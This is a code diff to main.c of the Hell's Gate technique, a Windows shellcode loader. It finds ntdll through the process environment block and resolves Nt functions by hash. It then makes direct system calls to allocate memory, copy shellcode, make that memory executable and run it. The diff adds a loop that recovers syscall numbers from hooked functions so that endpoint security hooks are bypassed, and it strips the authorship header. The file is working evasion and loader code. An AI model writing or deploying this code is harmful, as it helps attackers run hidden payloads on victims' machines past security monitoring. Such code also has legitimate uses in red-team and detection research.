@@ -1,14 +1,3 @@
-/*+===================================================================
-  File:      main.c
-  Summary:   Original C Implementation of the Hell's Gate VX Technique
-  Classes:   N/A
-  Functions: N/A
-  Origin:    https://github.com/am0nsec/HellsGate
-##
-  Authors: 
-             Paul Laine (@am0nsec)
-             smelly__vx (@RtlMateusz)
-===================================================================+*/
 #pragma once
 #include <Windows.h>
 #include "structs.h"
@@ -33,7 +22,6 @@ typedef struct _VX_TABLE {
   Function prototypes.
 --------------------------------------------------------------------*/
 PTEB RtlGetThreadEnvironmentBlock();
-PPEB RtlGetProcessEnvironmentBlock();
 BOOL GetImageExportDirectory(
 	_In_ PVOID                     pModuleBase,
 	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
@@ -61,9 +49,8 @@ extern HellDescent();
 INT wmain() {
 	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
 	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
-	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
+	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
 		return 0x1;
-	}
 
 	// Get NTDLL module 
 	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
@@ -75,16 +62,20 @@ INT wmain() {
 
 	VX_TABLE Table = { 0 };
 	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
-	GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory);
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
+		return 0x1;
 
 	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
-	GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx);
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
+		return 0x1;
 
 	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
-	GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory);
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
+		return 0x1;
 
 	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
-	GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject);
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
+		return 0x1;
 
 	Payload(&Table);
 	return 0x00;
@@ -95,14 +86,6 @@ PTEB RtlGetThreadEnvironmentBlock() {
 	return (PTEB)__readgsqword(0x30);
 #else
 	return (PTEB)__readfsdword(0x16);
-#endif
-}
-
-PPEB RtlGetProcessEnvironmentBlock() {
-#if _WIN64
-	return (PPEB)__readgsqword(0x60);
-#else
-	return (PPEB)__readfsdword(0x30);
 #endif
 }
 
@@ -146,13 +129,34 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
 			pVxTableEntry->pAddress = pFunctionAddress;
 
-			// MOV EAX 
-			if (*((PBYTE)pFunctionAddress + 3) == 0xb8) {
-				BYTE high = *((PBYTE)pFunctionAddress + 5);
-				BYTE low = *((PBYTE)pFunctionAddress + 4);
-				pVxTableEntry->wSystemCall = (high << 8) | low;
-				break;
-			}
+			// Quick and dirty fix in case the function has been hooked
+			WORD cw = 0;
+			while (TRUE) {
+				// check if syscall, in this case we are too far
+				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
+					return FALSE;
+
+				// check if ret, in this case we are also probaly too far
+				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
+					return FALSE;
+
+				// First opcodes should be :
+				//    MOV R10, RCX
+				//    MOV RCX, <syscall>
+				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
+					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
+					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
+					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
+					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
+					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
+					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
+					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
+					pVxTableEntry->wSystemCall = (high << 8) | low;
+					break;
+				}
+
+				cw++;
+			};
 		}
 	}
 
@@ -173,7 +177,7 @@ BOOL Payload(PVX_TABLE pVxTable) {
 	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));
 
 	// Change page permissions
-	ULONG ulOldProtect = NULL;
+	ULONG ulOldProtect = 0;
 	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
 	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
 
